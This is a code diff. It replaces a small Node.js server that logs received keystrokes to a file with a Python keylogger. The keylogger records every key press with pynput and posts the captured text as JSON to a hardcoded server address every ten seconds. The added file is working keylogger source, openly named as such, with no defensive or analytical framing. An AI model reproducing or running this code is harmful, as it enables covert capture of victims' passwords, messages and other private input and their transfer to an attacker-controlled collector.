@@ -1,32 +1,59 @@
-const express = require('express');
-const bodyParser = require('body-parser');
-const fs = require('fs');
-const app = express();
-const port = 3000;
+# keylogger.py
 
-// Middleware to parse JSON bodies
-app.use(bodyParser.json());
+from pynput import keyboard
+import requests
+import json
+import threading
 
-// Endpoint to receive keystrokes
-app.post('/', (req, res) => {
-    const keyboardData = req.body.keyboardData;
-    if (keyboardData) {
-        console.log("Received keyboard data:", keyboardData);
-        // Append the received data to a file
-        fs.appendFile('keystrokes.log', keyboardData + '\n', (err) => {
-            if (err) {
-                console.error('Error writing to file', err);
-                res.status(500).send('Internal Server Error');
-            } else {
-                res.status(200).send('Data received');
-            }
-        });
-    } else {
-        res.status(400).send('Bad Request: No keyboardData in request');
-    }
-});
+# Global variable to store keystrokes
+text = ""
 
-// Start the server
-app.listen(port, '0.0.0.0', () => {
-    console.log(`Server listening at http://192.168.1.107:${port}`);
-});
+# Hardcode the IP address and port number of your server
+ip_address = "192.168.1.107"
+port_number = "3000"
+# Time interval in seconds to send data
+time_interval = 10
+
+def send_post_req():
+    global text
+    try:
+        # Convert keystrokes to JSON and send to server
+        payload = json.dumps({"keyboardData": text})
+        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type": "application/json"})
+        print(f"Sent data to server: {payload}")  # Print confirmation for debugging
+
+        # Reset the text after sending
+        text = ""
+
+        # Set up the timer to call send_post_req again
+        timer = threading.Timer(time_interval, send_post_req)
+        timer.start()
+    except Exception as e:
+        print(f"Couldn't complete request! Error: {e}")
+
+# Handle key press events
+def on_press(key):
+    global text
+
+    if key == keyboard.Key.enter:
+        text += "\n"
+    elif key == keyboard.Key.tab:
+        text += "\t"
+    elif key == keyboard.Key.space:
+        text += " "
+    elif key == keyboard.Key.shift:
+        pass
+    elif key == keyboard.Key.backspace:
+        if len(text) > 0:
+            text = text[:-1]
+    elif key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
+        pass
+    elif key == keyboard.Key.esc:
+        return False
+    else:
+        text += str(key).strip("'")
+
+# Start the keyboard listener and send the first POST request
+with keyboard.Listener(on_press=on_press) as listener:
+    send_post_req()
+    listener.join()
